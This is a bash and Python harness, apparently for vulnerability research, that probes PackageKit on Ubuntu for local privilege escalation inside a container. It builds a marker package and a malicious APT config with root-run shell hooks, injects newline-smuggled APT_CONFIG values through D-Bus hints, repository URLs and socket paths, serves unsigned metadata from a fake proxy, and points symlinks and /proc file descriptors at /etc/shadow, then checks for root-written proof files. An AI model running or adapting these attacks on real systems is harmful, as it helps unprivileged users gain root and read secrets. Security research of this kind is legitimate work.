#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/packagekit-transaction-deep2.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

run_in_target() {
  run docker exec "$TARGET" bash -lc "$1"
}

echo "PackageKit transaction deep2 probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

run_in_target '
set -euo pipefail
echo "== baseline target =="
cat /etc/os-release | sed -n "1,8p"
uname -a
id attacker
id selfauth
echo
echo "== PackageKit package/service proof =="
dpkg-query -W -f="\${Package}\t\${Version}\t\${Architecture}\n" \
  packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \
  python3-gi apt dbus polkitd systemd dpkg 2>&1 | sort || true
systemctl cat packagekit.service
systemctl status packagekit.service --no-pager -l | sed -n "1,18p" || true
echo
echo "== PackageKit policy/action proof =="
awk "/org.freedesktop.packagekit.package-install-untrusted/{flag=1} flag{print} /<\/action>/{if(flag) exit}" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy
awk "/org.freedesktop.packagekit.system-sources-configure/{flag=1} flag{print} /<\/action>/{if(flag) exit}" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy
awk "/org.freedesktop.packagekit.system-sources-refresh/{flag=1} flag{print} /<\/action>/{if(flag) exit}" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy
awk "/org.freedesktop.packagekit.system-network-proxy-configure/{flag=1} flag{print} /<\/action>/{if(flag) exit}" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy
echo
echo "== PackageKit interface anchors =="
grep -R -n "method name=\"SetHints\"\|method name=\"Cancel\"\|method name=\"GetDetailsLocal\"\|method name=\"GetFilesLocal\"\|method name=\"InstallFiles\"\|method name=\"RefreshCache\"\|method name=\"RepoEnable\"\|method name=\"RepoSetData\"\|method name=\"SetProxy\"" /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit*.xml
'

run docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail

work=/tmp/packagekit-transaction-deep2
home=/home/selfauth
profile="$home/.bash_profile"
profile_bak="$work/bash_profile.backup"
profile_had="$work/bash_profile.had"
root_marker=/root/packagekit_transaction_deep2_root
short_apt=/tmp/pkdeep2.conf
runner="$home/packagekit_transaction_deep2_runner.sh"
probe_py="$home/packagekit_transaction_deep2_probe.py"
monitor_pid=

cleanup_target() {
  set +e
  if [[ -n "${monitor_pid:-}" ]]; then
    kill "$monitor_pid" 2>/dev/null || true
    wait "$monitor_pid" 2>/dev/null || true
  fi
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  if [[ -e "$profile_had" && -e "$profile_bak" ]]; then
    cp -a "$profile_bak" "$profile"
    chown selfauth:selfauth "$profile"
  else
    rm -f "$profile"
  fi
  rm -f "$runner" "$probe_py" "$short_apt"
  dpkg -r packagekit-transaction-deep2-root >/dev/null 2>&1 || true
  rm -f "$root_marker"
  rm -rf "$work"
  rm -f /var/cache/PackageKit/downloads/*packagekit-transaction-deep2* 2>/dev/null || true
  systemctl restart packagekit.service >/dev/null 2>&1 || true
  systemctl reset-failed packagekit.service polkit.service dbus.service >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

echo
echo "== target cleanup/setup =="
cleanup_target
install -d -o selfauth -g selfauth -m 0700 "$work"
if [[ -e "$profile" ]]; then
  cp -a "$profile" "$profile_bak"
  touch "$profile_had"
fi
loginctl terminate-user selfauth >/dev/null 2>&1 || true
systemctl stop getty@tty1.service >/dev/null 2>&1 || true
systemctl restart packagekit.service >/dev/null 2>&1 || true

runuser -u selfauth -- bash <<'BUILD_ATTACKER'
set -Eeuo pipefail
work=/tmp/packagekit-transaction-deep2
short_apt=/tmp/pkdeep2.conf
root_marker=/root/packagekit_transaction_deep2_root
pkg="$work/pkg"
deb="$work/packagekit-transaction-deep2-root.deb"
rm -rf "$pkg"
mkdir -p "$pkg/DEBIAN" "$pkg/usr/local/share/packagekit-transaction-deep2"
cat > "$work/evil-apt.conf" <<EOF
APT::Update::Pre-Invoke { "/bin/sh -c '\''id > $root_marker'\''"; };
DPkg::Pre-Install-Pkgs { "/bin/sh -c '\''id > $root_marker.dpkg'\''"; };
EOF
cp "$work/evil-apt.conf" "$short_apt"
chmod 0644 "$work/evil-apt.conf" "$short_apt"
cat > "$pkg/DEBIAN/control" <<'EOF'
Package: packagekit-transaction-deep2-root
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: PackageKit Deep2 Probe <root@example.invalid>
Description: PackageKit transaction deep2 marker package
EOF
cat > "$pkg/DEBIAN/config" <<'EOF'
#!/bin/sh
set -eu
if command -v db_input >/dev/null 2>&1; then
  db_input low packagekit-transaction-deep2-root/question || true
  db_go || true
fi
exit 0
EOF
cat > "$pkg/DEBIAN/templates" <<'EOF'
Template: packagekit-transaction-deep2-root/question
Type: string
Default: default
Description: PackageKit deep2 debconf question
 This template exists to force the interactive debconf path if an install
 reaches maintainer-script setup.
EOF
cat > "$pkg/DEBIAN/postinst" <<'EOF'
#!/bin/sh
set -eu
{
  echo "packagekit-transaction-deep2 postinst ran"
  date -Is
  id
  echo "DEBIAN_FRONTEND=${DEBIAN_FRONTEND-}"
  echo "DEBCONF_PIPE=${DEBCONF_PIPE-}"
  echo "APT_CONFIG=${APT_CONFIG-}"
} > /root/packagekit_transaction_deep2_root
chmod 0600 /root/packagekit_transaction_deep2_root
exit 0
EOF
chmod 0755 "$pkg/DEBIAN/config" "$pkg/DEBIAN/postinst"
printf 'packagekit transaction deep2 payload\n' > "$pkg/usr/local/share/packagekit-transaction-deep2/payload.txt"
dpkg-deb --build "$pkg" "$deb"
ls -l "$deb" "$work/evil-apt.conf" "$short_apt"
BUILD_ATTACKER

cat > "$work/root_monitor.py" <<'PYROOT'
#!/usr/bin/env python3
import os
import time

needles = (
    b"PKDEEP2",
    b"packagekit-transaction-deep2",
    b"pkdeep2",
    b"APT_CONFIG",
    b"APT::",
    b"Dir::",
    b"Acquire::",
    b"DEBIAN_FRONTEND",
    b"DEBCONF_PIPE",
    b"http_proxy",
    b"https_proxy",
    b"ftp_proxy",
    b"no_proxy",
    b"LANG",
    b"LC_",
)
interesting_cmd = (
    "packagekit",
    "apt",
    "dpkg",
    "debconf",
    "gpgv",
    "http",
    "https",
)
seen = set()
end = time.time() + 170

def read(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return b""

while time.time() < end:
    for name in os.listdir("/proc"):
        if not name.isdigit():
            continue
        base = "/proc/" + name
        cmd_raw = read(base + "/cmdline")
        if not cmd_raw:
            continue
        cmd = cmd_raw.replace(b"\0", b" ").decode("utf-8", "replace")
        if not any(x in cmd for x in interesting_cmd):
            continue
        env = read(base + "/environ")
        if not env:
            continue
        items = [x for x in env.split(b"\0") if any(n in x for n in needles)]
        if not items:
            continue
        try:
            uid = os.stat(base).st_uid
        except Exception:
            uid = -1
        key = (name, tuple(items))
        if key in seen:
            continue
        seen.add(key)
        print(f"ENV_SNAPSHOT pid={name} uid={uid} cmd={cmd!r}", flush=True)
        separate_apt = 0
        separate_probe = 0
        for item in items:
            if item.startswith(b"APT_CONFIG="):
                separate_apt = 1
            if item.startswith(b"PKDEEP2"):
                separate_probe = 1
            print(f"  ENV_ITEM {item!r}", flush=True)
        print(f"  SEPARATE_APT_CONFIG={separate_apt} SEPARATE_PKDEEP2={separate_probe}", flush=True)
    time.sleep(0.03)
PYROOT
chmod 0755 "$work/root_monitor.py"

cat > "$probe_py" <<'PYACTIVE'
#!/usr/bin/env python3
import os
import shutil
import socket
import struct
import threading
import time
import traceback

import gi
gi.require_version("Gio", "2.0")
from gi.repository import Gio, GLib

BUS = "org.freedesktop.PackageKit"
ROOT = "/org/freedesktop/PackageKit"
PK = "org.freedesktop.PackageKit"
TX = "org.freedesktop.PackageKit.Transaction"
PROPS = "org.freedesktop.DBus.Properties"
ONLY_DOWNLOAD = 8
SIMULATE = 4

WORK = "/tmp/packagekit-transaction-deep2"
DEB = os.path.join(WORK, "packagekit-transaction-deep2-root.deb")
EVIL_APT = os.path.join(WORK, "evil-apt.conf")
SHORT_APT = "/tmp/pkdeep2.conf"
ROOT_MARKER = "/root/packagekit_transaction_deep2_root"

conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)


class FakeProxy:
    def __init__(self, label, delay=0.4):
        self.label = label
        self.delay = delay
        self.count = 0
        self.first_lines = []
        self.headers = []
        self.stop_event = threading.Event()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.port = self.sock.getsockname()[1]
        self.sock.listen(32)
        self.sock.settimeout(0.25)
        self.thread = threading.Thread(target=self._accept, daemon=True)
        self.thread.start()
        print(f"PROXY_READY label={self.label} port={self.port}", flush=True)

    def _accept(self):
        while not self.stop_event.is_set():
            try:
                client, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError as exc:
                if not self.stop_event.is_set():
                    print(f"PROXY_ACCEPT_ERROR label={self.label} error={exc!r}", flush=True)
                break
            threading.Thread(target=self._handle, args=(client, addr), daemon=True).start()

    def _handle(self, client, addr):
        try:
            client.settimeout(2.0)
            data = b""
            while b"\r\n\r\n" not in data and len(data) < 32768:
                chunk = client.recv(4096)
                if not chunk:
                    break
                data += chunk
            self.count += 1
            text = data.decode("latin1", "replace")
            lines = text.splitlines()
            first = lines[0] if lines else ""
            self.first_lines.append(first)
            print(f"PROXY_HIT label={self.label} addr={addr} first={first!r}", flush=True)
            for line in lines:
                low = line.lower()
                if low.startswith(("host:", "proxy-authorization:", "authorization:", "user-agent:")):
                    self.headers.append(line)
                    print(f"PROXY_HEADER label={self.label} {line!r}", flush=True)
            body = (
                f"PKDEEP2 fake repository body label={self.label}\n"
                f"APT_CONFIG={SHORT_APT}\n"
                f"APT::Update::Pre-Invoke:: '/bin/sh -c id > {ROOT_MARKER}'\n"
                "This is intentionally not signed repository metadata.\n"
            ).encode("utf-8")
            response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: text/plain\r\n"
                f"Content-Length: {len(body)}\r\n"
                "Connection: close\r\n"
                "\r\n"
            ).encode("ascii") + body
            time.sleep(self.delay)
            client.sendall(response)
        except Exception as exc:
            print(f"PROXY_HANDLE_ERROR label={self.label} error={exc!r}", flush=True)
        finally:
            try:
                client.close()
            except Exception:
                pass

    def close(self):
        self.stop_event.set()
        try:
            probe = socket.create_connection(("127.0.0.1", self.port), timeout=0.05)
            probe.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.thread.join(timeout=1.0)
        print(f"PROXY_COUNT label={self.label} count={self.count}", flush=True)


class FrontendSocket:
    def __init__(self, path):
        self.path = path
        self.events = []
        self.stop_event = threading.Event()
        os.makedirs(os.path.dirname(path), exist_ok=True)
        try:
            os.unlink(path)
        except FileNotFoundError:
            pass
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.bind(path)
        os.chmod(path, 0o666)
        self.sock.listen(8)
        self.sock.settimeout(0.25)
        self.thread = threading.Thread(target=self._accept, daemon=True)
        self.thread.start()
        print(f"FRONTEND_READY path={path!r}", flush=True)

    def _accept(self):
        while not self.stop_event.is_set():
            try:
                client, _ = self.sock.accept()
            except socket.timeout:
                continue
            except OSError as exc:
                if not self.stop_event.is_set():
                    self.events.append(("accept_error", repr(exc)))
                break
            if self.stop_event.is_set():
                client.close()
                continue
            try:
                cred = client.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, struct.calcsize("3i"))
                pid, uid, gid = struct.unpack("3i", cred)
                client.settimeout(0.25)
                try:
                    data = client.recv(256)
                except Exception as exc:
                    data = repr(exc).encode()
                self.events.append(("connect", pid, uid, gid, data[:80].hex()))
            finally:
                client.close()

    def close(self):
        self.stop_event.set()
        try:
            probe = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            probe.settimeout(0.05)
            probe.connect(self.path)
            probe.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.thread.join(timeout=1.0)
        print(f"FRONTEND_EVENTS path={self.path!r} events={self.events}", flush=True)
        try:
            os.unlink(self.path)
        except FileNotFoundError:
            pass


def variant(signature, args):
    return GLib.Variant(signature, args)


def call(path, iface, method, params=None, timeout=10000):
    return conn.call_sync(BUS, path, iface, method, params, None, Gio.DBusCallFlags.NONE, timeout, None)


def create_tx():
    tx = call(ROOT, PK, "CreateTransaction", None, 10000).unpack()[0]
    print(f"  tx={tx}", flush=True)
    return tx


def get_props(tx):
    try:
        raw = call(tx, PROPS, "GetAll", variant("(s)", (TX,)), 5000).unpack()[0]
        keys = ("Uid", "CallerActive", "Role", "Status", "TransactionFlags", "Interactive")
        picked = {k: raw[k] for k in keys if k in raw}
        print(f"  props={picked}", flush=True)
        return picked
    except GLib.Error as exc:
        print(f"  props_error={exc.message}", flush=True)
        return {}


def set_hints(tx, hints, label):
    try:
        call(tx, TX, "SetHints", variant("(as)", (hints,)), 5000)
        print(f"  SetHints {label}: ok {hints!r}", flush=True)
        return True
    except GLib.Error as exc:
        print(f"  SetHints {label}: {exc.message}", flush=True)
        return False


def set_proxy(http="", https="", ftp="", socks="", no_proxy="", pac=""):
    try:
        call(ROOT, PK, "SetProxy", variant("(ssssss)", (http, https, ftp, socks, no_proxy, pac)), 10000)
        print(f"SetProxy ok http={http!r} no_proxy={no_proxy!r} pac={pac!r}", flush=True)
        return True
    except GLib.Error as exc:
        print(f"SetProxy error {exc.message}", flush=True)
        return False


def invoke(tx, method, signature, args, label, wait=8.0, timeout=12000):
    signals = []
    loop = GLib.MainLoop()

    def sig_cb(_conn, _sender, path, _iface, signal, params, _data):
        unpacked = params.unpack()
        signals.append((signal, unpacked))
        print(f"  signal {label} path={path} {signal} {unpacked}", flush=True)
        if signal == "Finished":
            GLib.timeout_add(300, loop.quit)

    sub = conn.signal_subscribe(BUS, TX, None, tx, None, Gio.DBusSignalFlags.NONE, sig_cb, None)
    try:
        call(tx, TX, method, variant(signature, args), timeout)
        print(f"  method_return {label}: ok", flush=True)
    except GLib.Error as exc:
        print(f"  method_return {label}: {exc.message}", flush=True)
        conn.signal_unsubscribe(sub)
        return signals, False
    GLib.timeout_add(int(wait * 1000), loop.quit)
    loop.run()
    conn.signal_unsubscribe(sub)
    return signals, True


def try_call(tx, method, signature, args, label, timeout=5000):
    try:
        call(tx, TX, method, variant(signature, args), timeout)
        print(f"  direct_call {label}: ok", flush=True)
        return True
    except GLib.Error as exc:
        print(f"  direct_call {label}: {exc.message}", flush=True)
        return False


def wait_short(seconds=0.8):
    loop = GLib.MainLoop()
    GLib.timeout_add(int(seconds * 1000), loop.quit)
    loop.run()


def scenario_hint_env_refresh():
    print("== scenario: SetHints locale/unknown env strings into active RefreshCache ==", flush=True)
    proxy = FakeProxy("hint-env-refresh", delay=0.25)
    try:
        set_proxy(f"127.0.0.1:{proxy.port}", "", "", "", "localhost", "")
        tx = create_tx()
        get_props(tx)
        hints = [
            f"locale=C.UTF-8\nAPT_CONFIG={SHORT_APT}\nPKDEEP2_LOCALE_SPLIT=1",
            f"packagekit-transaction-deep2=x\nAPT_CONFIG={SHORT_APT}\nPKDEEP2_UNKNOWN_SPLIT=1",
            "interactive=true",
            "background=false",
            "cache-age=1",
            "supports-plural-signals=true",
        ]
        if set_hints(tx, hints, "locale-newline-refresh"):
            invoke(tx, "RefreshCache", "(b)", (True,), "refresh-hint-env", wait=18.0, timeout=15000)
        set_proxy("", "", "", "", "", "")
    finally:
        proxy.close()


def scenario_frontend_socket_path():
    print("== scenario: frontend-socket newline path with query/real-install auth boundary ==", flush=True)
    front_path = os.path.join(WORK, f"frontend\nAPT_CONFIG={SHORT_APT}")
    listener = FrontendSocket(front_path)
    try:
        tx = create_tx()
        get_props(tx)
        if set_hints(tx, [f"frontend-socket={front_path}", "interactive=true", "locale=C.UTF-8"], "frontend-newline"):
            invoke(tx, "GetUpdates", "(t)", (0,), "getupdates-frontend-newline", wait=8.0)

        tx = create_tx()
        get_props(tx)
        if set_hints(tx, [f"frontend-socket={front_path}", "interactive=true", "locale=C.UTF-8"], "frontend-newline-real"):
            invoke(tx, "InstallFiles", "(tas)", (0, [DEB]), "installfiles-real-frontend", wait=8.0)
    finally:
        listener.close()


def scenario_cancel_reuse():
    print("== scenario: running RefreshCache cancel and same-transaction reuse ==", flush=True)
    proxy = FakeProxy("cancel-refresh", delay=2.0)
    try:
        set_proxy(f"127.0.0.1:{proxy.port}", "", "", "", "", "")
        tx = create_tx()
        get_props(tx)
        set_hints(tx, ["locale=C.UTF-8", "interactive=true", "cache-age=1"], "pre-refresh")
        signals = []
        loop = GLib.MainLoop()

        def sig_cb(_conn, _sender, path, _iface, signal, params, _data):
            unpacked = params.unpack()
            signals.append((signal, unpacked))
            print(f"  signal cancel-refresh path={path} {signal} {unpacked}", flush=True)
            if signal == "Finished":
                GLib.timeout_add(300, loop.quit)

        sub = conn.signal_subscribe(BUS, TX, None, tx, None, Gio.DBusSignalFlags.NONE, sig_cb, None)
        try:
            call(tx, TX, "RefreshCache", variant("(b)", (True,)), 10000)
            print("  method_return cancel-refresh RefreshCache: ok", flush=True)
        except GLib.Error as exc:
            print(f"  method_return cancel-refresh RefreshCache: {exc.message}", flush=True)
        wait_short(0.2)
        try_call(tx, "InstallFiles", "(tas)", (0, [DEB]), "InstallFiles real while RefreshCache running")
        try_call(tx, "RepoEnable", "(sb)", ("ubuntu:noble-main", True), "RepoEnable while RefreshCache running")
        try_call(tx, "Cancel", "()", (), "Cancel running RefreshCache")
        GLib.timeout_add(12000, loop.quit)
        loop.run()
        conn.signal_unsubscribe(sub)
        get_props(tx)
        try_call(tx, "SetHints", "(as)", (["interactive=true", f"locale=C.UTF-8\nAPT_CONFIG={SHORT_APT}"],), "SetHints after cancel/finish")
        try_call(tx, "InstallFiles", "(tas)", (0, [DEB]), "InstallFiles real after cancel/finish")
        try_call(tx, "RefreshCache", "(b)", (True,), "RefreshCache second action after cancel/finish")
        set_proxy("", "", "", "", "", "")
    finally:
        proxy.close()

    print("== scenario: query/only-download transaction reuse after finish ==", flush=True)
    tx = create_tx()
    get_props(tx)
    invoke(tx, "GetUpdates", "(t)", (0,), "getupdates-before-reuse", wait=8.0)
    get_props(tx)
    try_call(tx, "InstallFiles", "(tas)", (0, [DEB]), "InstallFiles real after GetUpdates finished")

    tx = create_tx()
    get_props(tx)
    invoke(tx, "InstallFiles", "(tas)", (ONLY_DOWNLOAD, [DEB]), "only-download-before-reuse", wait=8.0)
    get_props(tx)
    try_call(tx, "InstallFiles", "(tas)", (0, [DEB]), "InstallFiles real after ONLY_DOWNLOAD finished")


def scenario_repo_source_config():
    print("== scenario: repo source configure paths from active non-admin user ==", flush=True)
    repo_ids = []
    tx = create_tx()
    loop = GLib.MainLoop()

    def repo_sig(_conn, _sender, path, _iface, signal, params, _data):
        unpacked = params.unpack()
        print(f"  signal repo-list path={path} {signal} {unpacked}", flush=True)
        if signal == "RepoDetail":
            repo_ids.append((unpacked[0], unpacked[2]))
        if signal == "Finished":
            GLib.timeout_add(300, loop.quit)

    sub = conn.signal_subscribe(BUS, TX, None, tx, None, Gio.DBusSignalFlags.NONE, repo_sig, None)
    try:
        call(tx, TX, "GetRepoList", variant("(t)", (0,)), 10000)
        print("  method_return GetRepoList: ok", flush=True)
        GLib.timeout_add(8000, loop.quit)
        loop.run()
    except GLib.Error as exc:
        print(f"  method_return GetRepoList: {exc.message}", flush=True)
    finally:
        conn.signal_unsubscribe(sub)
    enabled = [repo_id for repo_id, is_enabled in repo_ids if is_enabled]
    repo_id = enabled[0] if enabled else (repo_ids[0][0] if repo_ids else "ubuntu:noble-main")
    print(f"  selected_repo={repo_id!r} repo_count={len(repo_ids)}", flush=True)

    tx = create_tx()
    get_props(tx)
    invoke(tx, "RepoEnable", "(sb)", (repo_id, True), "repo-enable-noop", wait=7.0)

    tx = create_tx()
    get_props(tx)
    value = f"file://{WORK}\nAPT_CONFIG={SHORT_APT}\nPKDEEP2_REPOSETDATA=1"
    invoke(tx, "RepoSetData", "(sss)", (repo_id, "set-download-url", value), "repo-set-data-newline", wait=7.0)


def scenario_local_files_procfd():
    print("== scenario: local deb path, /proc fd, symlink, and root-file parser boundaries ==", flush=True)
    fd_src = os.path.join(WORK, "fd-source.deb")
    shutil.copyfile(DEB, fd_src)
    fd = os.open(fd_src, os.O_RDONLY)
    os.unlink(fd_src)
    fd_path = f"/proc/{os.getpid()}/fd/{fd}"
    print(f"  proc_fd_path={fd_path}", flush=True)
    try:
        for method, label in (("GetDetailsLocal", "details-procfd"), ("GetFilesLocal", "files-procfd")):
            tx = create_tx()
            get_props(tx)
            invoke(tx, method, "(as)", ([fd_path],), label, wait=7.0)

        tx = create_tx()
        get_props(tx)
        invoke(tx, "InstallFiles", "(tas)", (ONLY_DOWNLOAD, [fd_path]), "installfiles-only-download-procfd", wait=8.0)

        tx = create_tx()
        get_props(tx)
        invoke(tx, "InstallFiles", "(tas)", (0, [fd_path]), "installfiles-real-procfd", wait=8.0)
    finally:
        os.close(fd)

    link = os.path.join(WORK, "package-link.deb")
    try:
        try:
            os.unlink(link)
        except FileNotFoundError:
            pass
        os.symlink(DEB, link)
        tx = create_tx()
        get_props(tx)
        invoke(tx, "GetDetailsLocal", "(as)", ([link],), "details-symlink-to-deb", wait=7.0)
        os.unlink(link)
        os.symlink("/etc/shadow", link)
        tx = create_tx()
        get_props(tx)
        invoke(tx, "GetDetailsLocal", "(as)", ([link],), "details-symlink-to-shadow", wait=7.0)
    finally:
        try:
            os.unlink(link)
        except FileNotFoundError:
            pass

    tx = create_tx()
    get_props(tx)
    invoke(tx, "GetFilesLocal", "(as)", (["/etc/shadow"],), "fileslocal-shadow-direct", wait=7.0)


def main():
    print("== active user/session proof ==", flush=True)
    print(f"uid={os.getuid()} gid={os.getgid()} groups={os.getgroups()}", flush=True)
    print(f"tty={os.ttyname(0) if os.isatty(0) else 'not-a-tty'}", flush=True)
    print(f"XDG_SESSION_ID={os.environ.get('XDG_SESSION_ID')}", flush=True)
    for action in (
        "org.freedesktop.packagekit.system-sources-refresh",
        "org.freedesktop.packagekit.system-network-proxy-configure",
        "org.freedesktop.packagekit.system-sources-configure",
        "org.freedesktop.packagekit.package-install-untrusted",
        "org.freedesktop.packagekit.system-update",
    ):
        try:
            ret = call(ROOT, PK, "CanAuthorize", variant("(s)", (action,)), 5000).unpack()[0]
            print(f"CanAuthorize {action} -> {ret}", flush=True)
        except GLib.Error as exc:
            print(f"CanAuthorize {action} -> {exc.message}", flush=True)

    for name, func in (
        ("hint_env_refresh", scenario_hint_env_refresh),
        ("cancel_reuse", scenario_cancel_reuse),
        ("repo_source_config", scenario_repo_source_config),
        ("local_files_procfd", scenario_local_files_procfd),
        ("frontend_socket_path", scenario_frontend_socket_path),
    ):
        try:
            func()
        except Exception as exc:
            print(f"SCENARIO_ERROR {name}: {exc!r}", flush=True)
            traceback.print_exc()
        wait_short(0.8)

    set_proxy("", "", "", "", "", "")
    print("== active probe complete ==", flush=True)


if __name__ == "__main__":
    main()
PYACTIVE
chmod 0755 "$probe_py"
chown selfauth:selfauth "$probe_py"

cat > "$runner" <<'SH'
#!/bin/bash
set +e
out=/tmp/packagekit-transaction-deep2/active.out
exec >"$out" 2>&1
echo "active-runner-start $(date -Is)"
id
groups
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote 2>&1
python3 /home/selfauth/packagekit_transaction_deep2_probe.py
echo "active-runner-exit rc=$? $(date -Is)"
SH
chmod 0755 "$runner"
chown selfauth:selfauth "$runner"

cat > "$profile" <<'SH'
/home/selfauth/packagekit_transaction_deep2_runner.sh
exit
SH
chown selfauth:selfauth "$profile"

echo "== active-seat probe execution =="
python3 "$work/root_monitor.py" > "$work/root-monitor.out" 2>&1 &
monitor_pid=$!
timeout 210 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
kill "$monitor_pid" 2>/dev/null || true
wait "$monitor_pid" 2>/dev/null || true
monitor_pid=

echo
echo "== attacker-created package/config proof =="
ls -l "$work/packagekit-transaction-deep2-root.deb" "$work/evil-apt.conf" "$short_apt" 2>&1 || true
dpkg-deb -I "$work/packagekit-transaction-deep2-root.deb" 2>&1 || true
echo "--- evil apt config ---"
cat "$work/evil-apt.conf" 2>&1 || true

echo
echo "== active selfauth transcript =="
cat "$work/active.out" 2>&1 || true

echo
echo "== root process environment monitor =="
cat "$work/root-monitor.out" 2>&1 || true

echo
echo "== post-probe root proof checks =="
if [[ -e "$root_marker" ]]; then
  echo "ROOT_PROOF_PRESENT $root_marker"
  ls -l "$root_marker"
  cat "$root_marker"
else
  echo "ROOT_PROOF_ABSENT $root_marker"
fi
if [[ -e "$root_marker.dpkg" ]]; then
  echo "ROOT_DPKG_PROOF_PRESENT $root_marker.dpkg"
  ls -l "$root_marker.dpkg"
  cat "$root_marker.dpkg"
else
  echo "ROOT_DPKG_PROOF_ABSENT $root_marker.dpkg"
fi
dpkg-query -W -f="\${Package}\t\${Version}\t\${Status}\n" packagekit-transaction-deep2-root 2>&1 || true
find /var/cache/PackageKit -maxdepth 3 -iname '*packagekit*transaction*deep2*' -ls 2>/dev/null || true
systemctl is-system-running || true
systemctl --failed --no-legend || true

echo
echo "== cleanup =="
cleanup_target
trap - EXIT
for p in "$work" "$runner" "$probe_py" "$short_apt" "$root_marker" "$root_marker.dpkg"; do
  if [[ -e "$p" ]]; then
    echo "STILL_PRESENT $p"
  else
    echo "ABSENT $p"
  fi
done
dpkg-query -W packagekit-transaction-deep2-root 2>&1 || true
systemctl is-system-running || true
systemctl --failed --no-legend || true
TARGET_SCRIPT
